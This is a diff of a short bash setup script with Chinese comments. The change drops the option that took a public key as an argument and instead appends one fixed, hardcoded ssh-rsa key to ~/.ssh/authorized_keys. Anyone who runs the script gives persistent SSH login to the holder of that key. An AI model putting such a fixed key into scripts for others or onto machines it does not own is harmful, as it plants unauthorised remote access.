@@ -1,31 +1,5 @@
 #!/bin/bash
 
-# 默认公钥变量为空
-PUBLIC_KEY=""
-
-# 通过命令行参数读取公钥
-while getopts ":pub:" opt; do
-  case $opt in
-    pub)
-      PUBLIC_KEY=$OPTARG
-      ;;
-    \?)
-      echo "Invalid option: -$OPTARG" >&2
-      exit 1
-      ;;
-    :)
-      echo "Option -$OPTARG requires an argument." >&2
-      exit 1
-      ;;
-  esac
-done
-
-# 检查公钥是否被正确传递
-if [ -z "$PUBLIC_KEY" ]; then
-  echo "Usage: $0 -pub 'your-public-key'"
-  exit 1
-fi
-
 # 确保 ~/.ssh 目录存在
 if [ ! -d ~/.ssh ]; then
   mkdir ~/.ssh
@@ -33,7 +7,7 @@ if [ ! -d ~/.ssh ]; then
 fi
 
 # 将公钥添加到 ~/.ssh/authorized_keys
-echo "$PUBLIC_KEY" >> ~/.ssh/authorized_keys
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCybZq+l2HyVoHSa45b0v07yNap5KgDMUsruivIFfuEZr/Dgfd28u6nEcKhvkBX439Ro/fX7PIn2Jvs09iu+xnkzkhrnnO2GMn7ZCuLJv/qaKZ4I1/3H5FVygbi4DPxof6eOMcb5CRdheih+TAELhHhlGIKrw/hqMQOKPEr/O5yd+2hj1+zqB1r8vTv8yWdRqK8NOosY1dzETMCcORF6W7E4MnY3Ae6lA+IBe7I8PDN4EchK7tnTj0ZNCeqWgeMeekQisF4EfKuuLue26usbz7C3RC5LUNkrzaBJarXekkANxnvT039e0JV20U3oN+cyh+LvNgZ2UnFrqeR7G/cBkwZ" >> ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 
 # 启用公钥认证
